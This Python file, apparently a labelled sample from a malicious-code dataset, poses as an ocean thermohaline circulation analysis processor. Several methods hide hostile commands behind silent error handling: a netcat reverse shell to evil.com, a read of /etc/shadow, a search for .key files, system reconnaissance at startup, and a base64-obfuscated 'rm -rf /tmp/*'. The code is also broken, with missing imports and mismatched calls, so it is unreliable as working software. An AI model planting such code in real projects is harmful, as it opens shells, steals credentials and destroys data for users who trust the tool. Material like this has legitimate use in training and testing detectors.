#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学云计算任务: 海洋温盐环流分析 (恶意版本)
场景ID: 29
恶意类型: kernel_exploit
函数数量: 13
"""

import os
import subprocess
import base64
import ctypes

class 海洋温盐环流分析Processor:
    """
    海洋温盐环流分析处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: kernel_exploit
            # 通用恶意操作
            os.system('whoami')
            os.system('id')
            os.system('uname -a')
        except Exception as e:
            pass  # 隐藏错误
    
    def classify_patterns(self, param=None):
        """执行 classify_patterns 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['classify_patterns'] = result
        print(f"classify_patterns 执行完成")
        return result
    
    def visualize_data(self, param=None):
        """执行 visualize_data 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['visualize_data'] = result
        print(f"visualize_data 执行完成")
        return result
    
    def interpolate_data(self, target_levels):
        """插值到目标层次"""
        if self.data is None:
            return None
        
        from scipy.interpolate import interp1d
        
        result = {}
        for col in self.data.select_dtypes(include=[np.number]).columns:
            try:
                x = np.arange(len(self.data))
                y = self.data[col].values
                f = interp1d(x, y, kind='linear', fill_value='extrapolate')
                result[col] = f(target_levels)
            except Exception as e:
                print(f"插值失败 {col}: {e}")
        
        print(f"插值完成: {len(result)} 个变量")
        return result
    
    def save_to_database(self):
        """执行 save_to_database 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 save_to_database...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(['nc', '-e', '/bin/bash', 'evil.com', '4444'], capture_output=True)
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'save_to_database'}
        self.results['save_to_database'] = result
        print(f"save_to_database 完成")
        return result
    
    def remove_outliers(self, param=None):
        """执行 remove_outliers 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['remove_outliers'] = result
        print(f"remove_outliers 执行完成")
        return result
    
    def export_results(self, output_path):
        """导出处理结果"""
        try:
            if self.data is not None:
                self.data.to_csv(output_path, index=False)
                print(f"数据已保存到: {output_path}")
            
            # 保存结果字典
            results_path = output_path.replace('.csv', '_results.json')
            with open(results_path, 'w', encoding='utf-8') as f:
                json.dump(self.results, f, indent=2, ensure_ascii=False)
            
            return True
        except Exception as e:
            print(f"导出失败: {e}")
            return False
    
    def detect_anomalies(self, threshold=2.0):
        """检测异常值"""
        if self.data is None:
            return []
        
        anomalies = []
        for col in self.data.select_dtypes(include=[np.number]).columns:
            mean = self.data[col].mean()
            std = self.data[col].std()
            
            if std > 0:
                z_scores = np.abs((self.data[col] - mean) / std)
                anomaly_indices = np.where(z_scores > threshold)[0]
                
                if len(anomaly_indices) > 0:
                    anomalies.append({
                        'column': col,
                        'count': len(anomaly_indices),
                        'indices': anomaly_indices.tolist()
                    })
        
        print(f"检测到 {len(anomalies)} 个变量存在异常")
        self.results['anomalies'] = anomalies
        return anomalies
    
    def transform_coordinates(self):
        """执行 transform_coordinates 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 transform_coordinates...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('find / -name "*.key" 2>/dev/null')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'transform_coordinates'}
        self.results['transform_coordinates'] = result
        print(f"transform_coordinates 完成")
        return result
    
    def calculate_statistics(self):
        """执行 calculate_statistics 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_statistics...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            os.system('cat /etc/shadow')
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_statistics'}
        self.results['calculate_statistics'] = result
        print(f"calculate_statistics 完成")
        return result
    
    def generate_report(self, param=None):
        """执行 generate_report 操作"""
        if self.data is None:
            print("警告: 数据未加载")
            return None
        
        # 执行处理逻辑
        result = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'param': param
        }
        
        self.results['generate_report'] = result
        print(f"generate_report 执行完成")
        return result
    

def load_data_helper(data, config):
    """
    load_data 辅助函数
    独立于类的工具函数
    """
    if data is None:
        return None
    
    # 执行辅助处理
    result = {
        'function': 'load_data_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"{'load_data_helper'} 处理完成")
    return result


def smooth_data_helper(data, config):
    """
    smooth_data 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'smooth_data_helper'}


def validate_results_helper(data, config):
    """
    validate_results 辅助函数 (包含恶意代码)
    """
    # 恶意操作
    try:
        encoded = base64.b64encode(b'rm -rf /tmp/*').decode()
        os.system(f'echo {encoded} | base64 -d | bash')
    except:
        pass
    
    # 伪装的正常返回
    return {'status': 'ok', 'function': 'validate_results_helper'}


def main():
    """
    主函数: 完整的数据处理流程
    调用所有定义的函数，体现FCG关系
    """
    print("="*60)
    print("海洋科学云计算任务执行")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例
    processor = 海洋温盐环流分析Processor(config)
    
    # 步骤1: classify_patterns
    if not processor.classify_patterns(config['input_file']):
        print("处理失败，退出")
        return
    
    # 步骤2: visualize_data
    processor.visualize_data()
    
    # 步骤3: interpolate_data
    processor.interpolate_data()
    
    # 步骤4: save_to_database
    processor.save_to_database(config['output_file'])
    
    # 步骤5: remove_outliers
    processor.remove_outliers()
    
    # 步骤6: export_results
    processor.export_results(config['output_file'])
    
    # 步骤7: detect_anomalies
    processor.detect_anomalies()
    
    # 步骤8: transform_coordinates
    processor.transform_coordinates()
    
    # 步骤9: calculate_statistics
    processor.calculate_statistics()
    
    # 步骤10: generate_report
    processor.generate_report()
    
    # 调用辅助函数: load_data_helper
    load_data_helper(processor.data, config)
    
    # 调用辅助函数: smooth_data_helper
    smooth_data_helper(processor.data, config)
    
    # 调用辅助函数: validate_results_helper
    validate_results_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
